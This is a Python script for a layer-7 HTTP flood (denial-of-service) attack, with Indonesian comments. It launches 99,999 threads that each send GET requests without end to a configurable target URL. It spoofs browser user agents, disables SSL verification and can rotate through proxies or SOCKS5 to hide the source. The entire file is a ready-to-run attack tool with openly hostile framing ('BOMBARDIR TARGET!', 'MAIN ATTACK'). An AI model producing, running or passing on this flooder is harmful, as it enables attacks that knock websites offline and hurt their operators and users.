import threading
import requests
import random
import socket
import socks
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# ====== KILL ALL SSL ERRORS ======
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
# ================================

# ====== TARGET & CONFIG ======
target_url = "https://target-website.com"  # GANTI INI!
use_proxy = False  # Set True kalau mau pakai proxy/Socks5
proxy_list = []  # Isi dengan proxy/Socks5 (opsional)
# =============================

# ====== FAKE USER AGENTS ======
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]
# =============================

# ====== BYPASS SSL & PROXY ======
def setup_session():
    session = requests.Session()
    session.verify = False  # Matikan SSL verification
    session.timeout = 5  # Timeout request (detik)
    
    if use_proxy and proxy_list:
        proxy = random.choice(proxy_list)
        session.proxies = {
            'http': proxy,
            'https': proxy
        }
    return session
# ================================

# ====== FLOOD FUNCTION ======
def flood():
    session = setup_session()
    while True:
        try:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
            }
            # BOMBARDIR TARGET!
            response = session.get(target_url, headers=headers)
            print(f"[+] REQUEST SENT! (Status: {response.status_code})")
        except Exception as e:
            print(f"[-] ERROR: {str(e)}")
# ============================

# ====== MAIN ATTACK ======
print("[!] STARTING 99,999 THREADS... 😈")
for i in range(99999):
    thread = threading.Thread(target=flood, daemon=True)
    thread.start()
    print(f"[+] THREAD {i+1} LAUNCHED!", end='\r')

print("\n[!] ATTACK IS RUNNING! PRESS CTRL+C TO STOP (or wait until your PC crashes)")

# Biarkan script terus berjalan
while True:
    pass
# ========================
